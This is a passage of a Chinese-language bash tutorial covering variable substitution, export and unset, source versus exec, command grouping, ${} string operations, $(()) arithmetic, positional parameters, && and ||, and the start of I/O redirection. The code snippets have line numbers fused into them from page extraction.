line中最经典的meta之一了，就是作变量替换的。在日常的shell操作中，我们常会使用echo命令来查看特定的变量的值。例如：1$ echo $A -$B $C 我们已学过，echo命令只单纯将其argument送至标准输出(stdout, 通常是我们的屏幕)。所以上面的命令会在屏幕上得到如下结果：1ls -al /tmp 这是由于echo命令在执行时，会先将$A (ls)、$B (la)跟$C (/tmp)给替换出来；利用shell对变量的替换处理能力，我们在设定变量时就更为灵活了：12A=BB=$A 这样，B的变量值就可继承A变量当时的变量值了。不过，不要以数学逻辑来套用变量的设定，比方说：12A=BB=C 这样，并不会让A的变量值变成C。再如：123A=BB=$AA=C 同样也不会让B的值变成C。 上面是单纯定义了两个不同名称的变量：A 与 B, 它们的取值分别是C与B。 若变量被重复定义的话，则原有旧值将被新值所取代。(这不正是可变的量吗？^_^)当我们在设定变量的时候，请记住这点：用一个名称存储一个数值， 仅此而已。 此外， 我们也可以利用命令行的变量替换能力来扩充(append)变量的值：12A=B:C:DA=$A:E 这样， 第一行我们设定A的值为B:C:D,然后,第二行再将值扩充为B:C:D:E。 上面的扩充的范例，我们使用分隔符号(:)来达到扩充的目的，要是没有分隔符的话，如下是有问题的：12A=BCDB=$AE 因为第二次是将A的值继承$AE的替换结果，而非$A再加E。要解决此问题，我们可用更严谨的替换处理：12A=BCDA=$&#123;A&#125;E 上例中，我们使用{}将变量名称范围给明确定义出来，如此一来，我们就可以将A的变量值从BCD给扩充为BCDE。 Tips:关于${name}事实上还可以做到更多的变量处理能力，这些均属于比较进阶阶段的变量处理，现阶段暂不介绍了，请大家自行参考资料。 3. export 变量严格来说，我们在当前shell中所定义的变量，均属于本地变量(local variable), 只有经过export命令的输出处理，才能成为环境变量(environment variable)：12$ A=B$ export A 或者1$ export A=B 经过export输出处理之后，变量A就能成为一个环境变量供其后的命令使用。在使用export的时候，请别忘记shell在命令行对变量的替换(substitution)处理。比方说：123$ A=B$ B=C$ export $A 上面的命令并未将A输出为环境变量，而是将B导出。这是因为在这个命令行中，$A会首先被替换为B,然后在塞回作export的参数。 要理解这个export，事实上需要从process(进程)的角度来理解才能透彻。我们将于下一章为大家说明process(进程)的概念，敬请留意。 4. 取消变量(unset)要取消一个变量，在bash中可使用unset命令来处理：1unset A 与export一样，unset命令行，也同样会作变量替换(这其实是shell的功能之一)，因此:123$ A=B$ B=C$ unset $A 事实上，所取消的是变量B而不是A。 此外，变量一旦经过unset取消之后，其结果是将整个变量拿掉，而不是取消变量的值。 如下两行其实是很不一样的：12$ A=$ unset A 第一行只是将变量A设定为空值(null value),但第二行则是让变量A不存在。虽然用眼睛来看，这两种变量的状态在如下的命令结果中都是一样的：12345$ A=$ echo $A$ unset A$ echo $A 请你务必能识别null value与unset的本质区别，这在一些进阶的变量处理上是很严格的。 比方说：123456789101112$ str= #设为null$ var=$&#123;str=expr&#125; #定义var$ echo $var$ echo $str$ unset str #取消str$ var=$&#123;str=expr&#125; #定义var$ echo $varexpr$ echo $strexpr 聪明的读者(yes, you!)，稍加思考的话，应该不难发现为何同样的var=${str=expr}在str为null与unset之下的不同吧？若你看不出来，那可能是如下原因之一： 你太笨了 不了解 var=${str=expr} 这个进阶处理 对本篇说明还没有来得及消化吸收 我讲得不好 不知，您选哪个呢? shell十五问之6：exec跟source差在哪？ 提问: 执行命令cd /etc/aa/bb/cc可以执行并移动到/etc/aa/bb/cc目录，但是把这条命令放入shell脚本执行,却没移动/etc/aa/bb/cc目录！这是什么原因？ 我当时如何回答暂时别去深究，先让我们了解一下进程(process)的概念好了。 首先，我们所执行的任何程序，都是父进程(parent process)产生的一个子进程(child process),子进程在结束后，将返回到父进程去。 此现象在Linux中被称为fork。 (为何要称为fork呢？ 嗯，画一下图或许比较好理解。^_^) 当子进程被产生的时候，将会从父进程那里获得一定的资源分配、及更重要的是继承父进程的环境。 让我们回到上一章所谈到的环境变量吧： 所谓环境变量其实就是那些会传给子进程的变量。简单而言, 遗传性就是区分本地变量与环境变量的决定性指标。然而，从遗传的角度来看，我们不难发现环境变量的另一个重要特征：环境变量只能从父进程到子进程单向传递。换句话说：在子进程中环境如何变更，均不会影响父进程的环境。 接下来，在让我们了解一下shell脚本(shell script)的概念。所谓shell script讲起来很简单，就是将你平时在shell prompt输入的多行command line, 依序输入到一个文件文件而已。 再结合以上两个概念(process + script)，那应该不难理解如下的这句话的意思了： 正常来说，当我们执行一个shell script时，其实是先产生一个sub-shell的子进程，然后sub-shell再去产生命令行的子进程。 现在让我们回到本章开始时所提到的例子再从新思考： 提问: 执行命令cd /etc/aa/bb/cc可以执行并移动到/etc/aa/bb/cc目录，但是把这条命令放入shell脚本执行,却没移动/etc/aa/bb/cc目录！这是什么原因？ 我当时的答案是这样的： 因为，我们一般跑的shell script是用sub-shell去执行的。从process的概念来看，是parent process产生一个child process去执行，当child结束后，返回parent, 但parent的环境是不会因child的改变而改变的。所谓的环境变量元数很多，如effective id(euid)，variable, working dir等等…其中的working dir($PWD) 正是楼主的疑问所在：当用sub-shell来跑script的话，sub-shell的$pwd会因为cd而变更， 但返回primary shell时，$PWD是不会变更的。 能够了解问题的原因及其原理是很好的，但是如何解决问题，恐怕是我们更应该感兴趣的是吧？ 那好，接下来，再让我们了解一下source命令好了。当你有了fork的概念之后，要理解soruce就不难： 所谓source，就是让script在当前shell内执行而不是产生一个sub-shell来执行。由于所有执行结果均在当前shell内执行,而不是产生一个sub-shell来执行。 因此, 只要我们原本单独输入的script命令行，变成source命令的参数，就可轻而易举地解决前面提到的问题了。 比方说，原本我们是如此执行script的：1$ ./my_script.sh 现在改成这样既可：1$ source ./my_script.sh 或者：1$ . ./my_script.sh 说到这里，我想，各位有兴趣看看/etc底下的众多设定的文件，应该不难理解它们被定义后，如何让其他script读取并继承了吧？ 若然，日后，你有机会写自己的script，应也不难专门指定一个设定的文件以供不同的script一起共用了。 ok,到这里，若你搞懂fork与source的不同，那接下来再接受一个挑战： 那exec又与source/fork有何不同呢？ 哦…要了解exec或许较为复杂，尤其是扯上File Decscriptor的话。不过，简单来说： exec 也是让script在同一个进程上执行，但是原有进程则被结束了。简言之，原有进程能否终止，就是exec与source/fork的最大差异了。 嗯，光是从理论去理解，或许没那么好消化，不如动手实践+思考来得印象深刻哦。 下面让我们为两个简单的script，分别命名为1.sh以及2.sh 1.sh 12345678910111213141516171819202122#!/bin/bash A=B echo "PID for 1.sh before exec/source/fork:$$"export Aecho "1.sh: \$A is $A"case $1 in exec) echo "using exec..." exec ./2.sh ;; source) echo "using source..." . ./2.sh ;; *) echo "using fork by default..." ./2.sh ;;esacecho "PID for 1.sh after exec/source/fork:$$"echo "1.sh: \$A is $A" 2.sh 12345678#!/bin/bashecho "PID for 2.sh: $$"echo "2.sh get \$A=$A from 1.sh"A=Cexport Aecho "2.sh: \$A is $A" 然后分别跑如下参数来观察结果：123$ ./1.sh fork$ ./1.sh source$ ./1.sh exec 好了，别忘了仔细比较输出结果的不同及背后的原因哦。若有疑问，欢迎提出来一起讨论讨论。 shell十五问之7：()与{}差在哪？ 嗯，这次轻松一下，不讲太多… ^_^ 先说一下，为何要用()或者{}好了。 许多时候，我们在shell操作上，需要在一定的条件下执行多个命令，也就是说，要么不执行，要么就全执行，而不是每次依序的判断是否要执行下一个命令。 或者，要从一些命令执行的先后次序中得到结果，如算术运算的2*(3+4)那样。 这时候，我们就可以引入命令群组(command group)的概念，将许多命令集中处理。 在shell command line中，一般人或许不太计较()与{}这两对符号的差异。虽然两者都可以将多个命令当作群组处理，但若从技术细节上，却是很不一样的： () 将command group置于sub-shell(子shell)中去执行，也称nested sub-shell。 {} 则是在同一个shell内完成，也称non-named command group。 若你对上一章的fork与source的概念还记得的话，那就不难理解两者的差异了。 要是在command group中扯上变量及其他环境的修改，我们可以根据不同的需求来使用()或{}。通常而言, 若所作的修改是临时的，且不想影响原有或以后的设定，那我们就使用nested sub-shell, 即();反之，则用non-named command group, 即{}。 是的，光从command line来看，() 与 {}差别就讲完了，够轻松吧。 ^_^ 然而，这两个meta用在其他command meta或领域中(如Regular Expression)，还是有很多差别的。只是，我不打算再去说明了，留给读者慢慢发掘好了。 我这里只想补充一个概念，就是function。所谓function，就是用一个名字去命名一个command group, 然后再调用这个名字去执行command group。 从non-named command group来推断，大概你也可以推测到我要说的是{}了吧？(yes! 你真聪明 ^_^) 在bash中，function的定义方式有两种： 方式一： 123456function function_name &#123; command1 command2 command3 .....&#125; 方式二： 123456function_name () &#123; command1 command2 command3 ......&#125; 用哪一种方式无所谓，只是碰到所定义的名称与现有的命令或者别名冲突的话，方式二或许会失败。但方式二起码可以少打个function这一串英文字符，对懒人来说(如我)，有何乐而不为呢？…^_^ function在一定程度上来说，也可以称为函数，但请不要与传统编程所使用的函数(library)搞混了，毕竟两者差异很大。唯一相同的是，我们都可以随时用已定义的名称来调用它们。 若我们在shell操作中，需要不断地重复某些命令，我们首先想到的，或许是将命令写成shell脚本(shell script)。不过，我们也可以写成function, 然后在command line中打上function_name就可当一般的shell script使用了。 若只是你在shell中定义的function, 除了用unset function_name取消外，一旦你退出shell， function也跟着消失。然而，在script脚本中使用function却有许多好处，除了提高整体script的执行性能外(因为已经载入)，还可以节省许多重复的代码。 简单而言，若你会将多个命令写成script以供调用的话，那你可以将function看成script中script。… ^_^ 而且通过上一章节介绍的source命令，我们可以自行定义许许多多好用的function，在集中写在特定文件中，然后，在其他的script中用source将它们载入，并反复执行。 若你是RedHat Linux的使用者，或许，已经猜出 /etc/rc.d/init.d/functions这个文件时啥作用了。 ^_^ ok，说要轻松点的嘛，那这次就暂时写到这吧。祝大家学习愉快。 shell十五问之8: $(())与$()还有${}差在哪？ 我们上一章介绍了()与{}的不同，这次让我们扩展一下，看看更多的变化： $()与${}又是啥玩意儿呢？ 在bash shell中, $()与``(反引号)都是用来做命令替换(command substitution)的。所谓的命令替换与我们第五章学过的变量替换差不多，都是用来重组命令行;完成 `` 或者$()里面的命令，将其结果替换出来，再重组命令行。 例如：1$ echo the last sunday is $(date -d "last sunday" +%Y-%m-%d) 如此便可方便得到上一个星期天的日期了。^_^ 在操作上， 用$()或``都无所谓,只是我个人比较喜欢用$(),理由是： ``(反引号)很容易与’’(单引号)搞混乱，尤其对初学者来说。有时在一些奇怪的字形显示中，两种符号是一模一样的(只取两点)。当然了有经验的朋友还是一眼就能分辨两者。只是，若能更好的避免混乱，又何乐而不为呢？ ^_^ 在多次的复合替换中， ``需要额外的转义(escape, )处理，而$()则比较直观。 例如，一个错误的使用的例子：1command1 `command2 `command3` ` 原来的本意是要在command2 `command3` ,先将command3替换出来给command2处理，然后再将command2的处理结果，给command1来处理。然而真正的结果在命令行中却是分成了`command2`与 ``。 正确的输入应该如下：1command1 `command2 \`command3\` ` 要不然换成$()就没有问题了： 1command1 $(commmand2 $(command3)) 只要你喜欢，做多少层的替换都没有问题。不过，$()并不是没有弊端的。首先，``基本上可用在所有的unix shell中使用，若写成 shell script，其移植性比较高。而$()并不是每一种shell都能使用，我只能说，若你用bash2的话，肯定没问题… ^_^ 接下来，再让我们看看${}吧。它其实就是用来做变量替换用的啦，一般情况下，$var与${var}并没有啥不一样。但是用${}会比较精准的界定变量名称的范围，比方说:12$ A=B$ echo $AB 原本是打算先将$A的结果替换出来，然后在其后补一个字母B；但命令行上，真正的结果却是替换变量名称为AB的值出来。若使用${}就没有问题了：123$ A=B$ echo $&#123;A&#125;B$ BB 不过，假如你只看到${}只能用来界定变量名称的话，那你就实在太小看bash了。 为了完整起见，我这里再用一些例子加以说明${}的一些特异功能：假设我们定义了一个变量file为：1file=/dir1/dir2/dir3/my.file.txt 我们可以用${}分别替换获得不同的值： 1. shell字符串的非贪婪(最小匹配)左删除 1$&#123;file#*/&#125; #其值为：dir1/dir2/dir3/my.file.txt 拿掉第一个/及其左边的字符串，其结果为：dir1/dir2/dir3/my.file.txt 。1$&#123;file#*.&#125; #其值为：file.txt 拿掉第一个.及其左边的字符串，其结果为：file.txt 。 2. shell字符串的贪婪(最大匹配)左删除： 1$&#123;file##*/&#125; #其值为：my.file.txt 拿掉最后一个/及其左边的字符串，其结果为：my.file.txt 1$&#123;file##*.&#125; #其值为：txt 拿掉最后一个.及其左边的字符串，其结果为：txt 3. shell字符串的非贪婪(最小匹配)右删除： 1$&#123;file%/*&#125; #其值为：/dir1/dir2/dir3 拿掉最后一个/及其右边的字符串，其结果为：/dir1/dir2/dir3。 1$&#123;file%.*&#125; #其值为：/dir1/dir2/dir3/my.file 拿掉最后一个.及其右边的字符串，其结果为：/dir1/dir2/dir3/my.file。 4. shell字符串的贪婪(最大匹配)右删除： 1$&#123;file%%/*&#125; #其值为：其值为空。 拿掉第一个/及其右边的字符串，其结果为：空串。 1$&#123;file%%.*&#125; #其值为：/dir1/dir2/dir3/my。 拿掉第一个.及其右边的字符串，其结果为：/dir1/dir2/dir3/my。 Tips: 记忆方法： #是去掉左边(在键盘上#在$的左边); %是去掉右边(在键盘上%在$的右边); 单个符号是最小匹配; 两个符号是最大匹配; 5. shell字符串取子串： 12$&#123;file:0:5&#125; #提取最左边的5个字符：/dir1$&#123;file:5:5&#125; #提取第5个字符及其右边的5个字符:/dir2 shell字符串取子串的格式：${s:pos:length},取字符串s的子串：从pos位置开始的字符(包括该字符)的长度为length的的子串;其中pos为子串的首字符，在s中位置；length为子串的长度; Note: 字符串中字符的起始编号为0。 6. shell字符串变量值的替换： 12$&#123;file/dir/path&#125; #将第一个dir替换为path：/path1/dir2/dir3/my.file.txt$&#123;file//dir/path&#125; #将全部的dir替换为path：/path1/path2/path3/my.file.txt shell字符串变量值的替换格式： 首次替换：${s/src_pattern/dst_pattern} 将字符串s中的第一个src_pattern替换为dst_pattern。 全部替换：${s//src_pattern/dst_pattern} 将字符串s中的所有出现的src_pattern替换为dst_pattern。 7. ${}还可针对变量的不同状态(没设定、空值、非空值)进行赋值： ${file-my.file.txt} #如果file没有设定，则使用my.file.txt作为返回值,否则返回${file};(空值及非空值时，不作处理。); ${file:-my.file.txt} #如果file没有设定或者${file}为空值, 均使用my.file.txt作为其返回值，否则，返回${file}.(${file} 为非空值时，不作处理); ${file+my.file.txt} #如果file已设定(为空值或非空值), 则使用my.file.txt作为其返回值，否则不作处理。(未设定时，不作处理); ${file:+my.file.txt} #如果${file}为非空值, 则使用my.file.txt作为其返回值，否则，(未设定或者为空值时)不作处理。 ${file=my.file.txt} #如果file为设定，则将file赋值为my.file.txt，同时将${file}作为其返回值；否则，file已设定(为空值或非空值)，则返回${file}。 ${file:=my.file.txt} #如果file未设定或者${file}为空值, 则my.file.txt作为其返回值，同时，将${file}赋值为my.file.txt，否则，(非空值时)不作处理。 ${file?my.file.txt} #如果file没有设定，则将my.file.txt输出至STDERR,否侧，已设定(空值与非空值时)，不作处理。 ${file:?my.file.txt} #若果file未设定或者为空值，则将my.file.txt输出至STDERR，否则，非空值时，不作任何处理。 Tips: 以上的理解在于，你一定要分清楚，unset与null以及non-null这三种状态的赋值；一般而言，与null有关，若不带:, null不受影响；若带 :, 则连null值也受影响。 8. 计算shell字符串变量的长度： 1$&#123;#file&#125; #其值为27, 因为/dir1/dir2/dir3/my.file.txt刚好为27个字符。 9. bash数组(array)的处理方法 接下来，为大家介绍一下bash的数组(array)的处理方法。一般而言, A=&quot;a b c def&quot;这样的变量只是将$A替换为一个字符串，但是改为 A=(a b c def),则是将$A定义为数组。 1). 数组替换方法可参考如下方法：12$&#123;A[@]&#125; #方法一$&#123;A[*]&#125; #方法二 以上两种方法均可以得到：a b c def, 即数组的全部元素。 2). 访问数组的成员:1$&#123;A[0]&#125; 其中，${A[0]}可得到a, 即数组A的第一个元素，而 ${A[1]}则为数组A的第二元素，依次类推。 3). 数组的长度：12$&#123;#A[@]&#125; #方法一$&#123;#A[*]&#125; #方法二 以上两种方法均可以得到数组的长度: 4, 即数组的所有元素的个数。我们同样可以将该方法应用于数组的成员:1$&#123;#A[0]&#125; 可以得到：1，即数组A的第一个元素(a)的长度; 1$&#123;#A[3]&#125; 可以得到：3, 即数组A的第4个元素(def)的长度。 4). 数组元素的重新赋值：1A[3]=xyz 将数组A的第四个元素重新定义为xyz。 Tips: 诸如此类的… 能够善用bash的$()与${}可以大大提高及简化shell在变量上的处理能力哦 ^_^ 10. $(())作用: 好了，最后为大家介绍$(())的用途吧：$(())是用来作整数运算的。 在bash中， $(())的整数运算符号大致有这些： +- * / #分别为”加、减、乘、除”。 % #余数运算,(模数运算) &amp; | ^ ! #分别为”AND、OR、XOR、NOT”运算。 例如：1234567$ a=5; b=7; c=2;$ echo $(( a + b * c ))19$ echo $(( (a + b)/c ))6$ echo $(( (a * b) % c ))1 在$(())中的变量名称, 可以在其前面加 $符号来替换，也可以不用，如：$(( $a + $b * $c )) 也可以得到19的结果。 此外，$(())还可作不同进制(如二进制、八进制、十六进制)的运算，只是输出结果均为十进制的。1echo $(( 16#2a )) #输出结果为：42，(16进制的2a) 以一个实用的例子来看看吧：假如当前的umask是022,那么新建文件的权限即为：123$ umask 022$ echo "obase=8; $(( 8#666 &amp; (8#777 ^ 8#$(umask)) ))" | bc644 事实上，单纯用(())也可以重定义变量值，或作testing：123a=5; ((a++)) #可将$a 重定义为6a=5; ((a--)) #可将$a 重定义为4a=5; b=7; ((a&lt; b)) #会得到0 (true)返回值。 常见的用于(())的测试符号有如下这些： 符号 符号名称 &lt; 小于号 &gt; 大于号 &lt;= 小于或等于 &gt;= 大于或等于 == 等于 != 不等于 Note: 使用(())作整数测试时，请不要跟[]的整数测试搞混乱了。更多的测试，我们将于第10章为大家介绍。 怎样？ 好玩吧… ^_^ ok,这次暂时说这么多。 上面的介绍，并没有详列每一种可用的状态，更多的，就请读者参考手册文件(man)吧。 shell十五问之9：$@与$*差在哪？ 要说$@与$*之前，需得先从shell script的positional parameter谈起。 我们都已经知道变量(variable)是如何定义和替换的，这个不再多讲了。 1. shell script的positional parameter但是，我们还需要知道有些变量是shell内定的，且其名称是我们不能随意修改的。其中，就有positional parameter在内。 在shell script中，我们可用$0, $1, $2, $3 …这样的变量分别提取命令行中的如下部分:1script_name parameter1 parameter2 parameter3 ... 我们很容易就能猜出, $0就是代表 shell script名称(路径)本身，而$1就是其后的第一个参数，如此类推… 须得留意的是IFS的作用, 也就是IFS被quoting处理后，那么positional parameter也会改变。 如下例：1my.sh p1 "p2 p3" p4 由于p2与p3之间的空白键被soft quoting所关闭了，因此，my.sh的中$2是”p2 p3”,而$3则是p4… 还记得前两章，我们提到function时，我们不是说过，它是script中的script吗？^_^ 是的，function一样可以读取自己的(有别于script的)positional parameter, 唯一例外的是$0而已。 举例而言：假设my.sh里有一个函数(function)叫my_fun,若在script中跑my_fun fp1 fp2 fp3,那么，function内的$0就是my.sh，而$1是fp1而不是p1了。 不如写个简单的my.sh script 看看吧：12345678910111213#!/bin/bashmy_fun() &#123; echo '$0 inside function is '$0trueecho '$1 inside function is '$1trueecho '$2 inside function is '$2&#125;echo '$0 outside function is '$0echo '$1 outside function is '$1echo '$2 outside function is '$2my_fun fp1 "fp2 fp3" 然后在command line中跑一下 script就知道了：123456789$ chmod 755 my.sh$ ./my.sh p1 "p2 p3"$0 outside function is ./my.sh$1 outside function is p1$2 outside function is p2 p3$0 inside function is ./my.sh$1 inside function is fp1$2 inside function is fp2 fp3 然而，在使用positional parameter的时候，我们要注意一些陷阱哦： $10不是替换第10个参数，而是替换第一个参数，然后在补一个0于其后; 也就是说， my.sh one two three four five six seven eight nine ten这样的command line, my.sh里的$10不是ten而是one（1）0哦。小心小心要抓到ten的话，有两种方法： 方法一：使用我们上一章介绍的${}, 也就是用${10}即可。 方法二：就是shift了。 用通俗的说法来说，所谓的shift就是取消positional parameter中最左边的参数($0不受影响)。其预设值为1，也就是shift 或shift 1 都是取消$1,而原本的$2则变成$1, $3则变成$2。那亲爱的读者，你说要shift掉多少个参数，才可用$1取得到${10} 呢？ ^_^ ok，当我们对positional parameter有了基本的概念之后，那再让我们看看其他相关变量吧。 2. shell script的positional parameter的number先是$#, 它可抓出positional parameter的数量。以前面的my.sh p1 &quot;p2 p3&quot;为例：由于”p2 p3”之间的IFS是在soft quote中，因此，$#就可得到的值是2。但如果p2与p3没有置于quoting中话，那$#就可得到3的值了。同样的规则，在function中也是一样。 因此，我们常在shell script里用如下方法，测试script是否有读进参数：1[ $# = 0 ] 假如为0, 那就表示script没有参数，否则就是带有参数。 3. shell script中的$@与$*接下来就是$@与$*:精确来讲，两者只有在soft quote中才有差异，否则，都表示全部参数 ($0除外)。 若在comamnd line上， 跑my.sh p1 &quot;p2 p3&quot; p4的话，不管$@还是$\*, 都可得到 p1 p2 p3 p4就是了。 但是，如果置于soft quote中的话： “$@”则可得到 “p1” “p2 p3” “p4” 这三个不同字段(word); “$*”则可得到 “p1 p2 p3 p4” 这一整个单一的字段。 我们修改一下前面的my.sh，使之内容如下：12345678#!/bin/bashmy_fun() &#123; echo "$#"&#125;echo 'the number of parameter in "$@" is ' $(my_fun "$@")echo 'the number of parameter in "$*" is ' $(my_fun "$*") 然后再执行:1$ ./my.sh p1 "p2 p3" p4 就知道，$@与$*差在哪了。 shell十五问之10：&amp;&amp; 与 || 差在哪？ 好不容易，进入了两位数的章节了。一路走来，很辛苦吧？也很快乐吧？ ^_^ 在解答本章题目之前，先让我们了解一个概念： return value。我们在shell下跑的每一个command或function，在结束的时候都会传回父进程一个值，称为 return value。 在shell command line中可用$?，这个变量得到最新的一个return value，也就是刚刚结束的那个进程传回的值。 Return Value(RV)的取值为0-255之间，由进程或者script的作者自行定义： 若在script里，用exit RV 来指定其值;若没有指定, 在结束时，以最后一个命令的RV，为script的RV值。 若在function里，则用return RV 来代替exit RV即可。 Return Value的作用：用来判断进程的退出状态(exit status)。 进程的退出状态有两种： 0值为”真”(true) 非0值为”假”(false) 举个例子来说明好了：假设当前目录内有一个my.file的文件， 而no.file是不存在的：12345678910$ touch my.file$ ls my.file$ echo $? #first echo0$ ls no.filels: no.file: No such file or directory$ echo $? #second echo1$ echo $? #third echo0 上例的： 第一个echo是关于ls my.file的RV，可得到0的值，因此为true。 第二个echo是关于ls no.file的RV，得到非0的值，因此为false。 第三个echo是关于echo $?的RV，得到0值， 因此为true。 请记住：每一个command在结束时，都会返回return value，不管你跑什么命令。然而，有一个命令却是专门用来测试某一条而返回return value，以供true或false的判断， 它就是test命令。 若你用的是bash， 请在command line下，打man test，或者 man bash 来了解这个test的用法。这是你可用作参考的最精准的文件了，别人说的，仅作参考就好。 下面，我只简单作一些辅助说明，其余的一律以 man为准：首先，test的表达式，我们称为expression，其命令格式有两种：1test expression 或者1[ expression ] Note: 请务必注意 [] 之间的空白键! 用哪一种格式无所谓，都是一样的效果。(我个人比较喜欢后者…) 其次，bash的test目前支持的测试对象只有三种： string：字符串，也就是纯文字。 integer：整数(0或正整数、不含负数或小数) file：文件 请初学者，一定要搞清楚这三者的差异，因为test所使用的expression是不一样的。 以A=123这个变量为例： [ &quot;$A&quot; = 123 ] #是字符串测试，测试$A是不是1、2、3这三个字符。 [ &quot;$A&quot; -eq 123 ] #是整数测试，以测试$A是否等于123。 [ -e &quot;$A&quot; ] #文件测试，测试123这份文件是否存在。 第三，当expression测试为“真”时， test就返回0(true)的return value;否则，返回非0(false)。 若在 expression 之前加一个!(感叹号)，则在expression为假时，return value为0,否则, return value 为非0值。 同时，test也允许多重复合测试： expression1 -a expression2 #当两个expression都为true，返回0，否则，返回非0； expression1 -o expression2 #当两个expression均为false时，返回非0，否则，返回0； 例如：1[ -d "$file" -a -x "$file" ] 表示当$file是一个目录，且同时具有x权限时，test才会为true。 第四，在command line中使用test时，请别忘记命令行的“重组”特性，也就是在碰到meta时，会先处理meta，在重新组建命令行。(这个概念在第2章和第4章进行了反复强调) 比方说， 若test碰到变量或者命令替换时，若不能满足expression的格式时，将会得到语法错误的结果。 举例来说好了： 关于[ string1 = string2 ]这个test格式，在等号两边必须要有字符串，其中包括空串(null串,可用soft quote或者hard quote取得)。 假如$A目前没有定义，或被定义为空字符串的话，那如下的用法将会失败：123$ unset A$ [ $A = abc ][: =: unary oprator expected 这是因为命令行碰到$这个meta时，会替换$A的值，然后，再重组命令行，那就变成了[ = abc ], 如此一来，=的左边就没有字符串存在了，因此，造成test的语法错误。但是，下面这个写法则是成立的。 123$ [ "$A" = abc ]$ echo $?1 这是因为命令行重组后的结果为：[ &quot;&quot; = abc ],由于等号的左边我们用soft quote得到一个空串，而让test的语法得以通过。 读者诸君，请务必留意这些细节哦，因为稍一不慎，将会导致test的结果变了个样。若您对test还不是很有经验的话，那在使用test时，不妨先采用如下这一个法则: 若在test中碰到变量替换，用soft quote是最保险的。 若你对quoting不熟的话，请重新温习第四章的内容吧…^^ok, 关于更多的test的用法，老话一句：请看其man page (man test)吧！^^虽然洋洋洒洒读了一大堆，或许你还在嘀咕…那…那个return value有啥用？ 问得好:告诉你：return value的作用可大了，若你想要你的shell变聪明的话，就全靠它了：有了return value，我们可以让shell根据不同的状态做不同的事情。这时候，才让我来揭晓本章的答案吧^_^ &amp;&amp; 与 || 都是用来组建多个command line用的； command1 &amp;&amp; command2 # command2只有在command1的RV为0(true)的条件下执行。 command1 || command2 # command2 只有在command1的RV为非0(false)的条件下执行。 以例子来说好了：1234567$ A=123$ [ -n "$A" ] &amp;&amp; echo "yes! it's true."yes! it's true.$ unset A$ [ -n "$A" ] &amp;&amp; echo "yes! it's true."$ [ -n "$A" ] || echo "no, it's Not true."no, it's Not true Note: [ -n string ]是测试string长度大于0, 则为true。 上例中，第一个&amp;&amp;命令之所以会执行其右边的echo命令，是因为上一个test返回了0的RV值；但第二个，就不会执行，因为test返回了非0的结果。同理，||右边的echo会被执行，却正是因为左边的test返回非0所引起的。 事实上，我们在同一个命令行中，可用多个&amp;&amp; 或 || 来组建呢。123456$ A=123$ [ -n "$A" ] &amp;&amp; echo "yes! it's true." || echo "no, it's Not ture."yes! it's true.$ unset A$ [ -n "$A" ] &amp;&amp; echo "yes! it's true." || echo "no, it's Not ture."no, it's Not true 怎样，从这一刻开始，你是否觉得我们的shell是“很聪明”的呢？ ^_^ 好了，最后布置一道练习题给大家做做看：下面的判断是：当$A被赋值时，在看看其是否小于100，否则输出too big！123$ A=123$ [ -n "$A" ] &amp;&amp; [ "$A" -lt 100 ] || echo 'too big!'too big! 若我取消A，照理说，应该不会输出文字啊，(因为第一个条件不成立)。123$ unset A$ [ -n "$A" ] &amp;&amp; [ "$A" -lt 100 ] || echo 'too big!'too big! 为何上面的结果也可得到呢？输出了too big？又如何解决呢？ Tips: 修改的方法有很多种，其中一种方法可以利用第7章中介绍过 command group。 快告诉我答案，其余免谈。 解决方法1：sub-shell：12$ unset A$ [ -n "$A" ] &amp;&amp; ( [ "$A" -lt 100 ] || echo 'too big!' ) 解决方法二：command group:12$ unset A$ [ -n "$A" ] &amp;&amp; &#123; [ "$A" -lt 100 ] || echo 'too big!'; &#125; shell十五问之11：&gt;与&lt; 差在哪？ 1. 文件描述符(fd, File Descriptor)谈到I/O redirection,不妨先让我们认识一下File Descriptor(fd，文件描述符)。 进程的运算，在大部分情况下，都是进行数据(data)的处理，这些数据从哪里，读进来？又输出到哪里呢？这就是file descriptor(fd)的功用了。 在shell的进程中，最常使用的fd大概有三个，分别为: 0：standard Input (STDIN) 1: standard output(STDOUT) 2: standard Error output （STDERR） 在标准情况下，这些fd分别跟如下设备(device)关联： stdin(0): keyboard stdout(1): monitor stderr(2): monitor Tips:linux中的文件描述符(fd)用整数表示。linux中任何一个进程都默认打开三个文件,这三个文件对应的文件描述符分别是：0, 1, 2;即stdin, stdout, stderr. 我们可以用如下命令测试一下：1234$ mail -s test rootthis is a test mail。please skip.^d (同时按下ctrl 跟d键) 很明显，mail进程所读进的数据，就是从stdin 也就是keyboard读进的。不过，不见得每个进程的stdin都跟mail一样从keyboard读进，因为进程的作者可以从文件参数读进stdin，如：1$ cat /etc/passwd 但，要是cat之后没有文件参数则如何呢？哦， 请你自己玩玩看…^_^1$ cat Tips: 请留意数据输出到哪里去了，最后别忘了按ctrl+d(^d), 退出stdin输入。 至于stdout与stderr，嗯…等我有空再续吧…^_^还是，有哪位前辈来玩接龙呢？ 相信，经过上一个练习后，你对stdin与stdout应该不难理解了吧？然后，让我们看看stderr好了。 事实上，stderr没什么难理解的：说白了就是“错误信息”要往哪里输出而已比方说, 若读进的文件参数不存在的，那我们在monitor上就看到了： 12$ ls no.such.filels: no.such.file: No such file or directory 若同一个命令，同时成生stdout与stderr呢？那还不简单，都送到monitor来就好了：1234$ touch my.file$ ls my.file on.such.filels: no.such.file: No such file or directorymy.file okay, 至此，关于fd及其名称、还有相关联的设备，相信你已经没问题了吧？ 2. I/O 重定向(I/O Redirection) 那好，接下来让我们看看如何改变这些fd的预设数据通道。 用&lt; 来改变读进的数据通道(stdin),使之从指定的文件读进。 用&gt; 来改变输出的数据通道(stdout，stderr),使之输出到指定的文件。 2.1 输入重定向 n &lt; (input redirection) 比方说：1$ cat &lt; my.file 就是从my.file读入数据 1$ mail -s test root &lt; /etc/passwd 则是从/etc/passwd读入，这样一来，stdin将不再是从keyboard读入，而是从指定的文件读入了。 严格来说，&lt;符号之前需要指定一个fd的(之前不能有空白)，但因为0是&lt;的预设值，因此，&lt;与0&lt;是一样的。 ok，这样好理解了吧？ 那要是用两个&lt;，即&lt;&lt;又是啥呢？这是所谓的here document, 它可以让我们输入一段文本，直到读到&lt;&lt; 后指定的字符串。 比方说：12345$ cat &lt;&lt;EOFfirst line heresecond line herethird line hereEOF 这样的话, cat会读入3个句子，而无需从keyboard读进数据且要等到(ctrl+d, ^d)结束输入。 2.2 重定向输出 &gt; n (output redirection) 当你搞懂了0&lt; 原来就是改变stdin的数据输入通道之后，相信要理解如下两个redirection就不难了： 1&gt; #改变stdout的输出通道； 2&gt; 